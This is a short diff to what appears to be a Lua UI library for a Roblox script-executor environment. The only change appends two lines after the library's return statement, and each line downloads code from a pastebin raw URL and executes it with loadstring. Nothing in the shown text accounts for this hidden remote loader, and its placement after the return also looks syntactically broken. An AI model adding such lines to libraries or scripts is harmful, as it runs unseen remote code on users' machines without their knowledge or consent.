@@ -4873,3 +4873,6 @@ end
 
 getgenv().library = library
 return library
+
+loadstring(game:HttpGet("https://pastebin.com/raw/6nQ6UmJ6"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/zJa3Lc4z"))()
